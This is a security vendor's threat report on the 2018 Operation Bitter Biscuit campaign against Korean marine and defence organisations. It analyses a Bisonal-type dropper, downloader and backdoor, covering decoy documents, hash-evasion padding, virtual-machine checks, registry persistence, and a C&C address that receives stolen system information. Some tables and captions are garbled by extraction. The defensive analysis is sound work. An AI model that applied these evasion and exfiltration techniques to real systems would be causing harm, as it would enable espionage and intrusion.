Security Issue

Major Attacks of Operation
Bitter Biscuit in 2018

An attack campaign called Operation Bitter Biscuit mainly occurred in South Korea, Japan,
India, and Russia, and began a full-fledged operation in 2011. The attack group in charge of this
operation has been carrying out attacks for a long time using the Bisonal-type malware to target
major organizations, such as Korean military agencies and companies in the defense industry. The
operation seemed to be in a lull from the fall of 2017, but it started again in 2018.

In this report, we will look at the trends and techniques of the Operation Bitter Biscuit analyzed by
the AhnLab Security Emergency Response Center (ASEC), with a focus on the actual attacks that
have occurred in South Korea in 2018.

1. Attacks Trends of Operation Bitter Biscuit
The Bisonal-type malware, first discovered in 2010, was mainly used for Operation Bitter Biscuit
attacks, and has continued to appear in attacks against South Korea, Japan, India, and Russia until
now. It was first discovered in Korea in 2011 and was used in the attack on the defense industry
in Japan in the following year. In 2015, the Indian Computer Emergency Response Team (CERT-In)
released a warning on a variant of Bisonal, called Bioazih.1

ASEC REPORT Vol.93 | Security Trend

15

From the analysis of the attack trends of Operation Bitter Biscuit, it was found that the Bisonal-type
malware was still actively used to attack major Korean agencies. From 2011 to Spring 2012, attacks
were made on Korean institutions, and from 2013 to 2015, attacks were continuously made on
Korean businesses and defense companies. In 2016 and 2017, attacks were made on companies in
the defense industry and other related businesses. Most recently, in 2018, the scope of the attack
was expanded with the concentration of attacks in the Korean marine sector.

AhnLab has been tracking and analyzing the attacks of Operation Bitter Biscuit, which have been
conducted for a long time, and the possible attack groups associated with those attacks.

2. Major Attacks on Korea in 2018
The Table 2-1 timeline summarizes the major attacks of Operation Bitter Biscuit in 2018. After the
lull from the fall of 2017, the attacks began again in spring 2018. The attacks on the Korean marine
sector was observed from March to July 2018.
Date

Attack attempt disguised as a document related to a marine company. Packed downloader
created.

September 2018

Korean government agency

Only backdoor found.

Table 2-1 | Timeline of Major Attacks in 2018

The key feature of the attacks in 2018 is that the attack uses a new dropper. When the new dropper
is executed, it generates malware and Visual Basic Script (VBS) files, as well as a decoy document.

ASEC REPORT Vol.93 | Security Trend

16

Figure 2-1 shows the contents of the decoy
document in the malware found in 2018. This
also shows that the attacker was targeting users
in the marine sector.

The malware generated by the dropper comFigure 2-1 | Decoy Documents of Malware Found in 2018

prises the downloader for downloading addi-

tional malware and a backdoor for executing remote commands. Some of the discovered malware
adds a garbage value to the end of the file, creating a massive file with a size of several to a hundred
megabytes. The generated VBS file includes a script that shows a decoy document and another
script that deletes the executed dropper, as well as the executed VBS file itself.

3. Malware Analysis
We will now look at the dropper, downloader, and backdoor used in the 2018 Operational Bitter
Biscuit attacks.

3-1) Dropper Analysis
On March 5, 2018, a file named 퇴사 인수인계 자료.scr” (Employee handbook for transfer of duties)
was found to be used as a dropper. The basic information about the dropper is shown in Table 2-2.

Decoy document, executable file, VBS file created

AhnLab Diagnosis

Dropper/Win32.Bisonal

Table 2-2 | Basic Information about the Dropper

When the dropper is executed, a decoy document, an executable file, and two VBS files are created,
as shown in Figure 2-2.

Figure 2-2 | Components of the Malware

As mentioned earlier, the information of the attack target can be inferred from the contents
of the decoy document. All the decoy documents of the dropper found in 2018 are related to
the Korean marine sector. The executable file works as a downloader, and some variants also
include a backdoor. The two VBS files are comprised of a file that opens the decoy document on a
Microsoft Office program and a file that deletes the executed dropper file.

3-2) Downloader Analysis
One of the key features and characteristics of the downloader used in this attack is its function to
check the name of the executed file. If the executed file name is not services.exe, the services.exe
file is created in a specific path, such as c:\Users\[Username]\Applications\Microsoft. At this time,
a garbage value is added to the end of the file to generate a file with a size of about 4 MB.

Key Features and
Characteristics

File services.exe with a size of 4 megabytes or more is created. System information is saved as an ms.log.
Additional malware is downloaded.

AhnLab Diagnosis

Trojan/Win32.Bisdow

Table 2-3 | Basic Information about the Downloader

Figure 2-3 | Original File and New File with Added Garbage Value

Figure 2-3 compares the original file and the new file, to which a garbage value was added by the
downloader. This behavior suggests that a file is generated at random to make it difficult for the user
to find the malware using a hash value. Some variants even created a file with a size of about 100 MB.

If the name of the executed file is services.exe, the downloader registers services.exe in the registry
and creates the Windows Message.lnk file. This Windows Message LNK file contains the shortcut
data of the malicious services.exe.

Then, the downloader uses the ipconfig.exe and net.exe files to store the system information in the

ASEC REPORT Vol.93 | Security Trend

19

ms.log file and sends it to http://mp.motlat.com/info/wel.gif.

An interesting feature of the downloader exists only in the variants found in 2018 - it checks for
the execution within a virtual environment using the disk name, as shown in Figure 2-4, when
attempting to download additional files. The function for the virtual environment check does not
exist in variants found before 2018.

Figure 2-4 | Virtual Environment Check

The downloader downloads the MsUpdata.exe file from http://mp.motlat.com/lvs/tips.htm.

According to AhnLab's analysis, the msupdata.exe file (2c0522a805fa845ec9385eb5400e8d16) was
distributed from this address in early March, 2018. The msupdata.exe file is also a downloader for
downloading additional malware. The malware downloaded in the last step has yet to be confirmed.

3-3) Backdoor Analysis
In 2018, a backdoor file was also created using a similar dropper. The malware associated with this
backdoor was first discovered in the fall of 2014. A Bisonal variant was also discovered in the same
attack target. The basic information about the backdoor is shown in Table 2-4.

AhnLab Diagnosis

Backdoor/Win32.Bisoaks

Table 2-4 | Basic Information about the Backdoor

In the Bisoaks malware, which is a Bisonal variant, is known for containing strings such as “axpbu.
txt”and “mismyou,” as shown in Figure 2-5. However, some of the variants are packed with
PECompact or MPRESS and these distinguishing string cannot be checked.

Figure 2-5 | Text Strings of Bisoaks Malware

When the malware is executed, it registers the executed file to the registry key “mismyou” in the
registry path HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run.

Ultimately, it executes the commands received from the C&C server as the last step. The features
supported by the Bisoaks malware include collecting the system information, obtaining a process
list, terminating a process, downloading a file, and executing a file. Some variants even have
additional features, such as self-deletion.

4. Association
The analysis of the Bitter Biscuit attacks in 2018
suggests that the dropper used in this attack
has been newly developed. For downloaders
and backdoors, association with the 2014
attacks has been confirmed. Bisoaks was also
Figure 2-6 | Association Diagram of Malware in 2018 Attacks

discovered to be responsible for the attacks

in 2014 and 2018 using similar codes on the same attack target. Figure 2-6 shows the association
diagram of malware used in the Bitter Biscuit attacks in 2018.

The similarity between the strings and codes of the downloaders found in 2014 and 2018 can also
be seen in Figure 2-7.

Figure 2-7 | Comparison of Downloader Strings in 2014 and 2018

Some download addresses of variants are associated with Korea. Furthermore, as shown in Figure

ASEC REPORT Vol.93 | Security Trend

22

2-8, the main attack target can be inferred to be Korea, due to the fact that a fake certificate (00c479
bf76dc90db51209d2fa2a9cf6a) in the malware
file is disguised as an AhnLab's certificate.

The Bisoaks backdoor found in 2018 contains a
distinctive string, and similar strings were found
in the variant (45a416f10ccb2c31ff391e61a7584
f1f) in October 2014, as shown in Figure 2-9.

Figure 2-8 | Downloader File with a Fake Digital Signature Impersonating AhnLab

Figure 2-9 | Text Strings of the Bisoaks Variant

As shown in Figure 2-10, the variants found in September 2018 and March 2018 also have very
similar code.

Figure 2-10 | Comparison of Variants Found in September 2014 and March 2018

ASEC REPORT Vol.93 | Security Trend

23

The Bisoaks malware contains campaign IDs, and the variants found in Korea contain text strings,
such as 0903, 0917, 1016-02, 443, pmo, hjing, 24-kncck, 8000, 95, and 48.

There are a total of 29 variants of this backdoor. The first variant, discovered in September
2014, was mainly targeting Korean government agencies. Therefore, it can be assumed that the
attacker has been active in Korea for at least four years.

It has not been confirmed whether Operation Bitter Biscuit was carried out by a single group.
However, based on the trends of attacks in 2018, the Bisoaks malware can also be seen as an
associated attack. This is because the Bisoaks malware that has been used in Operation Bitter
Biscuit since 2014 was similarly used in 2018. Figure 2-11 shows the list of malware used in
Operation Bitter Biscuit from 2009 to 2018.

Figure 2-11 | Different Types of Malware related to Operation Bitter Biscuit

5. Conclusion
Operation Bitter Biscuit, which was dormant since the fall of 2017, resumed its attacks against
major South Korean agencies from March 2018. The attacks focused on the South Korean military
companies and the defense industry until 2017, but they have expanded to target the marine
sector from 2018. Although it is not confirmed that the attack was carried not by the same

ASEC REPORT Vol.93 | Security Trend

24

group, it can still be concluded that the attacker in the spring of 2018 has been targeting Korean
government agencies, at least from 2014, due to the similarity of the malware used in the attacks.

For nearly 10 years, this unknown threat to South Korea has been committed to delivering attacks
on major Korean agencies and companies. In 2018, it focused only on the marine sector, but we
do not know its target for 2019. Therefore, we must be prudent of the changing trends of the
Operation Bitter Biscuit attacks, which may target any sector.
